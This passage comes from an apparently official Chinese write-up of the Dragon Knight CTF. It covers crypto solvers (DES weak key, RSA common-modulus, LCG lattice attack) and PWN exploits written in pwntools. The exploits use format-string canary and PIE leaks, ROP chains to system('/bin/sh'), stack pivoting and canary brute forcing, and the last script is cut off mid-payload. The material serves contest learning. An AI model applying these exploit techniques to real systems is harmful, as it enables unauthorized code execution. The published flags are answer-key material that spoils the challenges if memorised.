class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        m = <span class="built_in">int</span>(M[i,j])</span><br><span class="line">        flag += long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># DRKCTF&#123;a58986e7-33e5-4f65-8c22-b8a5e620752d&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="EzDES"><a href="#EzDES" class="headerlink" title="EzDES"></a><strong>EzDES</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc = des.encrypt(pad(flag,<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;t\xe4f\x19\xc6\xef\xaaL\xc3R&#125;\x08;K\xc9\x88\xa6|\nF\xc3\x12h\xcd\xd3x\xc3(\x91\x08\x841\xca\x8b\xc1\x94\xb5\x9f[\xcd\xc6\x9f\xf9\xf6\xca\xf5\x1a\xda\x16\xcf\x89\x154\xa1\xfe\xc5\x16\xcf\x89\x154\xa1\xfe\xc5&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>根据题目描述，从密钥入手，这道题主要想让师傅们了解到DES的弱密钥。<br>网上随便找个弱密钥就可以解了<br>exp.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;0101010101010101&quot;</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;t\xe4f\x19\xc6\xef\xaaL\xc3R&#125;\x08;K\xc9\x88\xa6|\nF\xc3\x12h\xcd\xd3x\xc3(\x91\x08\x841\xca\x8b\xc1\x94\xb5\x9f[\xcd\xc6\x9f\xf9\xf6\xca\xf5\x1a\xda\x16\xcf\x89\x154\xa1\xfe\xc5\x16\xcf\x89\x154\xa1\xfe\xc5&#x27;</span></span><br><span class="line">flag = des.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># DRKCTF&#123;We4k_K3y_1s_V3ry_D4nger0us_In_DES&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="MidRSA"><a href="#MidRSA" class="headerlink" title="MidRSA"></a><strong>MidRSA</strong></h3><h4 id="part1"><a href="#part1" class="headerlink" title="part1"></a><strong>part1</strong></h4><p>由题意知<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406255-f65f2b4b-281a-449c-ac59-c66b16f25af5.svg" alt="image.png"><br>我们取两个不同的i,j<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406399-5b3ea739-e448-4211-bfe2-b5523fad77d9.svg" alt="image.png"><br>于是有<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406403-87ad26c6-0884-45f6-8722-942d9abba452.svg" alt="image.png"><br>取两组这样的值，然后求公因数即可得到n<br>得到n之后右移300位即可得到前半部分的flag</p>
<h4 id="part2"><a href="#part2" class="headerlink" title="part2"></a><strong>part2</strong></h4><p>利用共模攻击的思路，设存在x,y，使得下式成立<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406470-abe52da0-c2f3-4db8-abdf-e36e768c4f6c.svg" alt="image.png"><br>我们便有<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406471-21b52f9d-749e-48de-8ae1-ac3c3cc75fb0.svg" alt="image.png"><br>这里gcd(e1,e2) !&#x3D; 1<br>我们需要再进行一次共模攻击<br>假设存在s,t，使得下式成立<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406498-0d7109f8-c3e5-45c3-8af9-4c98253c6c88.svg" alt="image.png"><br>即<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406635-0c9fbe2f-f353-4cbc-b1a7-f4bb9f360879.svg" alt="image.png"><br>则有<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406646-6c8af5ee-e86d-449c-bc55-69d319fe348b.svg" alt="image.png"><br><a href="https://exp.py/">exp.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>(<span class="params">c,e</span>):</span><br><span class="line">    knlist = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">            <span class="keyword">if</span> i!=j:</span><br><span class="line">                knlist.append(c[i]**e[j] - c[j]**e[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(knlist)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(knlist)):</span><br><span class="line">            <span class="keyword">if</span> i!=j:</span><br><span class="line">                kn = gmpy2.gcd(knlist[i],knlist[j])</span><br><span class="line">                <span class="keyword">if</span> kn != <span class="number">1</span>:</span><br><span class="line">                    n = kn</span><br><span class="line">                    flag1 = long_to_bytes(n &gt;&gt; <span class="number">300</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">b&quot;DRKCTF&quot;</span> <span class="keyword">in</span> flag1:</span><br><span class="line">                        <span class="keyword">return</span> flag1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt2</span>(<span class="params">c,e,n</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">e1,e2,c1,c2</span>):</span><br><span class="line">        s,x,y = gmpy2.gcdext(e1,e2)</span><br><span class="line">        res = <span class="built_in">pow</span>(c1,x,n) * <span class="built_in">pow</span>(c2,y,n) % n</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    res1 = decode(e[<span class="number">0</span>],e[<span class="number">1</span>],c[<span class="number">0</span>],c[<span class="number">1</span>])</span><br><span class="line">    res2 = decode(e[<span class="number">2</span>],gmpy2.gcd(e[<span class="number">0</span>],e[<span class="number">1</span>]),c[<span class="number">2</span>],res1)</span><br><span class="line">    flag2 = long_to_bytes(res2)</span><br><span class="line">    <span class="keyword">return</span> flag2</span><br><span class="line"></span><br><span class="line">e1 = [<span class="number">109</span>, <span class="number">71</span>, <span class="number">109</span>, <span class="number">73</span>]</span><br><span class="line">cipher1 = [<span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080</span>, <span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871</span>]</span><br><span class="line">e2 = [<span class="number">79572758141493570128961125255246129069540961757778793209698370333142346488381</span>, <span class="number">80555585862127636800866563977080055603517001358195529410497461746213789997225</span>, <span class="number">44651921320695090688745333790065512192118202496468714141526113242887125432380</span>]</span><br><span class="line">cipher2 = [<span class="number">58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057</span>, <span class="number">16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337</span>, <span class="number">80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546</span>]</span><br><span class="line">n = <span class="number">93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283</span></span><br><span class="line">flag1 = decrypt1(cipher1,e1)</span><br><span class="line">flag2 = decrypt2(cipher2,e2,n)</span><br><span class="line">flag = flag1 + flag2</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># DRKCTF&#123;5d0b96e8-e069-4378-82e7-120e4b761a0b&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Myencrypt"><a href="#Myencrypt" class="headerlink" title="Myencrypt"></a><strong>Myencrypt</strong></h3><h4 id="求解P"><a href="#求解P" class="headerlink" title="求解P"></a><strong>求解P</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def getMyPrime():              </span><br><span class="line">    while True:              </span><br><span class="line">        r = random.getrandbits(64)              </span><br><span class="line">        _p = r**6 -3*r**5 - r**4 + r**2 - r - 6</span><br><span class="line">        _q = r**7 + 2*r**6 + r**5 + 4*r**4 + 7*r**2 + r + 4653</span><br><span class="line">        if isPrime(_p) and isPrime(_q):              </span><br><span class="line">            return _p, _q</span><br></pre></td></tr></table></figure>

<p>由题目可知，根据p,q的特殊性，我们可以把n写成关于r的式子，即<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406737-a63247ac-3d4f-49a7-ad9a-7b21861645d0.svg" alt="image.png"><br>我们直接对n开13次方，得到的值记为temp，这个temp与实际上的r相差不大(这一点可以自己生成数据进行验证)。<br>在得到tmp之后，我们采取爆破的方式求解r，有了r就很容易求出p,q，然后再进行RSA求解得到LCG的模，也就是P</p>
<h4 id="求解flag"><a href="#求解flag" class="headerlink" title="求解flag"></a><strong>求解flag</strong></h4><p>上一步得到P之后，题目接下来的加密就是LCG的过程，只不过给出的状态值不全，而是模了2^{16}之后的值。此时我们需要进行推导<br>由<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406723-90b5d446-aaef-49e0-b29c-4441bd1c6d80.svg" alt="image.png"><br>拆成高低位来写，则有<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406750-a74efacc-25bf-4ef1-a2f4-620094e9b7b3.svg" alt="image.png"><br>其中H，L代表当前状态的高低位,化简得<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406841-a1f8da3c-a231-414d-b931-cdd131f018a7.svg" alt="image.png"><br>于是有<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406891-14b215e2-e8cc-4e98-812a-80741c73e077.svg" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406956-e7a82203-cc58-402e-bf31-821ebf3c40f8.svg" alt="image.png"><br>即<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406954-7ee6c6f6-7de3-469e-9940-0b8ded27c378.svg" alt="image.png"><br>将常数记为B<br>写到这里是为了后面更好理解B_i如何计算<br>回到题目，简单来写就是<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733407014-5ea2817a-676a-47a9-a378-e0b20b13ba9b.svg" alt="image.png"><br>也就是<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733407048-04d781f8-76c2-49e4-b049-6357273b0fe4.svg" alt="image.png"><br>构造格<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733407077-f96ecae1-9eff-4af2-8022-03518485eab6.svg" alt="image.png"><br>约后我们可以得到H_1，即可求得<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733407155-4164de0c-7c3f-474d-b664-5cc1511cd327.svg" alt="image.png"><br>再求解seed<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733407189-da32a146-59fa-47f5-ad91-415ad02742b1.svg" alt="image.png"><br>exp.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">17959692613208124553115435318871530105762927141420294800783695207170608966804977782615874404539156257549097962410144332053383210075663138848832474791712256427111304125146378883542387121684653496644116081809328796925343393644118376497507</span></span><br><span class="line">enc_P = <span class="number">17215745298239635988196009014709535403293865406390546681749129213899045156482782458937447412919331336842808052179915132663427715069134196783415529688715962754860563850858056507148936427379551986735103284388996678146580229028006898491552</span></span><br><span class="line">a = <span class="number">2759277675743644814124420138047586760905070650864591936190199977578763421196999718749092450720072564786874114432179104175692800471519816376692104515142375</span></span><br><span class="line">b = <span class="number">8111240578821759579875175166986910195923820191652867334412871591814076020421468033017946066268237980082938735686222173713853299600396887041341974719819186</span></span><br><span class="line">out = [<span class="number">39566</span>, <span class="number">15295</span>, <span class="number">19818</span>, <span class="number">55685</span>, <span class="number">49100</span>, <span class="number">6517</span>, <span class="number">2675</span>, <span class="number">9567</span>, <span class="number">37243</span>, <span class="number">40312</span>, <span class="number">42906</span>, <span class="number">35874</span>, <span class="number">44178</span>, <span class="number">1256</span>, <span class="number">40298</span>, <span class="number">29149</span>, <span class="number">35721</span>, <span class="number">19886</span>, <span class="number">63020</span>, <span class="number">50116</span>, <span class="number">6844</span>, <span class="number">39897</span>, <span class="number">16134</span>, <span class="number">50218</span>, <span class="number">44609</span>, <span class="number">46188</span>, <span class="number">52712</span>, <span class="number">49903</span>, <span class="number">20933</span>, <span class="number">5441</span>, <span class="number">19411</span>, <span class="number">8330</span>, <span class="number">6904</span>, <span class="number">39350</span>, <span class="number">60853</span>, <span class="number">43446</span>, <span class="number">35910</span>, <span class="number">43728</span>, <span class="number">61533</span>, <span class="number">13757</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_P</span>(<span class="params">n,c</span>):</span><br><span class="line">    r = gmpy2.iroot(n,<span class="number">13</span>)[<span class="number">0</span>]                </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):                </span><br><span class="line">        p = r**<span class="number">6</span> -<span class="number">3</span>*r**<span class="number">5</span> - r**<span class="number">4</span> + r**<span class="number">2</span> - r - <span class="number">6</span></span><br><span class="line">        q = r**<span class="number">7</span> + <span class="number">2</span>*r**<span class="number">6</span> + r**<span class="number">5</span> + <span class="number">4</span>*r**<span class="number">4</span> + <span class="number">7</span>*r**<span class="number">2</span> + r + <span class="number">4653</span></span><br><span class="line">        r = r+<span class="number">1</span>          </span><br><span class="line">        <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q) <span class="keyword">and</span> n==p*q:                </span><br><span class="line">            q = n // p</span><br><span class="line">            d = gmpy2.invert(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            P = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">            <span class="comment">#             print(P)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(P)</span><br><span class="line"></span><br><span class="line">P = get_P(n,enc_P)</span><br><span class="line"></span><br><span class="line">L = [<span class="number">0</span>] + out</span><br><span class="line">n = <span class="built_in">len</span>(out)</span><br><span class="line">A = [<span class="number">1</span>]</span><br><span class="line">B = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n):</span><br><span class="line">    A.append(a*A[i-<span class="number">1</span>] % P)</span><br><span class="line">    B.append((a*B[i-<span class="number">1</span>] + (a*L[i]+b-L[i+<span class="number">1</span>])*gmpy2.invert(<span class="number">2</span>^<span class="number">16</span>,P))%P)</span><br><span class="line"></span><br><span class="line">A = A[<span class="number">1</span>:]</span><br><span class="line">B = B[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">Ge = Matrix(ZZ,n+<span class="number">1</span>,n+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(A)):</span><br><span class="line">    Ge[i,i] = P</span><br><span class="line">    Ge[-<span class="number">2</span>,i] = A[i]</span><br><span class="line">    Ge[-<span class="number">1</span>,i] = B[i]</span><br><span class="line"></span><br><span class="line">Ge[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">Ge[-<span class="number">1</span>,-<span class="number">1</span>] = P // <span class="number">2</span>^<span class="number">16</span></span><br><span class="line"></span><br><span class="line">M = Ge.LLL()[<span class="number">0</span>]</span><br><span class="line">H1 = M[-<span class="number">2</span>]</span><br><span class="line">L1 = out[<span class="number">0</span>]</span><br><span class="line">seed1 = H1 * <span class="number">2</span>^<span class="number">16</span> + L1</span><br><span class="line"></span><br><span class="line">seed = ((seed1 - b)*gmpy2.invert(a,P))%P</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(seed)))</span><br><span class="line"><span class="comment"># DRKCTF&#123;a57b63a6-ecf5-46d3-a501-2d359a4fd168&#125;</span></span><br></pre></td></tr></table></figure>

<p>希望师傅们能有所收获。另外夹带一点私货，师傅们可以关注下我的博客<br><a href="https://dexterjie.github.io/">https://dexterjie.github.io</a></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><strong>PWN</strong></h2><h4 id="ez-quiz"><a href="#ez-quiz" class="headerlink" title="ez_quiz"></a><strong>ez_quiz</strong></h4><p>题目开了PIE和Canary保护：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733437877-846c498c-082e-4e7a-97f4-5d305ccbd96a.png" alt="image.png"><br>先本地运行附件，观察逻辑，首先需要在2s内输入token：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733438467-1a0b4f13-6647-4ab5-94a8-7b7ba3f6c25a.png" alt="image.png"><br>分析代码，题目先将输入字符串在encode函数先异或0xff再进行base32加密处理，并将处理后的字符串和“XOW3JPFLXGCK7TWMX6GMZIGOTK7ZJIELS65KBHU3TOG2BT4ZUDEJPGVATS7JDPVNQ2QL7EM3UCHZNGUC”比较：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733438026-6ba36561-77eb-4a03-a6cd-7292ca3f58ce.png" alt="image.png"><br>此处可以打断点动态调试看内存的token，也可以直接用Cyberchef解密得到token：DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733437939-50ac061e-f260-4e38-890d-06c9039332e5.png" alt="image.png"><br>使用eval()计算式子：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733439233-23bd9a14-b1a3-4db1-ae7f-1335e5c1ea50.png" alt="image.png"><br>根据token提示，存在格式化字符串漏洞：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733438338-f3281bed-4e37-491b-917f-93b3d45a9110.png" alt="image.png"><br>pwndbg调试发现Canary 在 Stack 上的地址为第0xd位，将Stack第0xa位地址-0x2042得到基址<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733438603-848470a1-3acf-4b72-b15b-7bfad6500758.png" alt="image.png"><br>程序存在pop rdi<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733438447-3cc1712f-868b-48bb-b7ef-4624b949f95f.png" alt="image.png"><br>通过格式化字符串泄露Canary和PIE后可写rop链执行 system(“&#x2F;bin&#x2F;sh”);<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733438874-c3f33b6b-91b9-441b-988b-fe70778901c8.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;ip&quot;,port)</span></span><br><span class="line">p = process(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">e = context.binary = ELF(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;token:&#x27;</span>)</span><br><span class="line">payload = <span class="built_in">str</span>(<span class="string">&#x27;DRKCTF&#123;P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie&#125;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(p.recvline().decode().strip().split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>].strip())))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;gift:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%13$p|%11$p|&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;|&#x27;</span>).strip(<span class="string">b&#x27;|&#x27;</span>), <span class="number">16</span>) - <span class="number">0x2042</span></span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;|&#x27;</span>).strip(<span class="string">b&#x27;|&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;PIE: <span class="subst">&#123;<span class="built_in">hex</span>(e.address)&#125;</span>&#x27;</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;Canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = e.address + <span class="number">0x3041</span></span><br><span class="line">pop_rdi = e.address + <span class="number">0x0000000000002072</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line">payload += p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(bin_sh)</span><br><span class="line">payload += p64(pop_rdi + <span class="number">1</span>)</span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="stack"><a href="#stack" class="headerlink" title="stack"></a><strong>stack</strong></h4><p>其实就是一个栈迁移，但是栈迁移一次无法达到我们控制栈上栈顶数据的作用，需要栈迁移两次，再搞个ROP就行。或者ogg直接getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def exploit():</span><br><span class="line">    li(&#x27;exploit...&#x27;)</span><br><span class="line">    bss_addr =0x0000000000404040+0x400</span><br><span class="line">    read_addr = 0x00000000040119B</span><br><span class="line">    pop_rdi_ret = 0x0000000000401210 </span><br><span class="line">    libc_pop_rdx_ret = 0x0000000000142c92</span><br><span class="line">    libc_pop_rsi_ret = 0x000000000002601f</span><br><span class="line">    puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class="line">    puts_got = elf.got[&quot;puts&quot;]</span><br><span class="line">    main_addr = 0x000000000401176</span><br><span class="line">    pl = &quot;A&quot;*0x100+p64(bss_addr)+p64(read_addr) #栈溢出</span><br><span class="line">    db()</span><br><span class="line">    sa(&quot;Hello, CTFer, do you know how to stack pivoting?\n&quot;,pl)</span><br><span class="line">    pl2 = &quot;A&quot;*(0x100)+p64(bss_addr+0x100)+p64(read_addr) #存放在bss_addr-0x100</span><br><span class="line">    s(pl2)</span><br><span class="line">    pl3 = &quot;/bin/sh\x00&quot;+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)#存放在bss_addr-0x100</span><br><span class="line">    s(pl3)</span><br><span class="line">    base_addr  = uu64()-libc.symbols[&quot;puts&quot;]</span><br><span class="line">    system_addr = base_addr+libc.symbols[&quot;system&quot;]</span><br><span class="line">    li(&quot;base_addrr ---------------&gt; 0x%x&quot;%base_addr)</span><br><span class="line">    li(&quot;system_addr -------------&gt; 0x%x&quot;%system_addr)</span><br><span class="line"></span><br><span class="line">    pl = &quot;A&quot;*0x100+p64(bss_addr)+p64(read_addr) #栈溢出</span><br><span class="line">    sa(&quot;Hello, CTFer, do you know how to stack pivoting?\n&quot;,pl)</span><br><span class="line">    pl2 = &quot;A&quot;*(0x100)+p64(bss_addr+0x100)+p64(read_addr) #存放在bss_addr-0x100</span><br><span class="line">    s(pl2)</span><br><span class="line">    #pl4 = p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(base_addr-0x100)+p64(system_addr)#存放在bss_addr-0x100</span><br><span class="line">    pl4 = p64(0)+p64(libc_pop_rdx_ret+base_addr)+p64(0)+p64(libc_pop_rsi_ret+base_addr)+p64(0)+p64(0xe3b04+base_addr)</span><br><span class="line">    s(pl4)</span><br></pre></td></tr></table></figure>

<h4 id="Canary"><a href="#Canary" class="headerlink" title="**Canary **"></a>**Canary **</h4><p>fork函数存在，于是可以爆破cnanry，爆破完后写一个orw就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#elf = ELF(&quot;./pwn1&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./dockerfile/bin/pwn1&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process([elf.path])</span><br><span class="line"><span class="comment">#p = remote(&#x27;121.196.193.233&#x27;,49188)</span></span><br><span class="line">pause()</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:</span><br><span class="line">    info(<span class="built_in">len</span>(canary))</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        p.sendafter(<span class="string">&quot;please input:\n&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x108</span> + canary + p8(c))</span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> p.recvline_contains(<span class="string">&#x27;stack smashing detected&#x27;</span>, timeout=<span class="number">1</span>):</span><br><span class="line">            canary += p8(c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">canary = u64(canary)</span><br><span class="line">success(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>* <span class="number">0x108</span> + p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040f23e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004493d7</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">payload += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x000000000047c4e5</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040f23e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004437a0</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x000000000047c4e5</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004018c2</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += p64(<span class="number">0x000000000040f23e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x00000000004c10e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += p64(<span 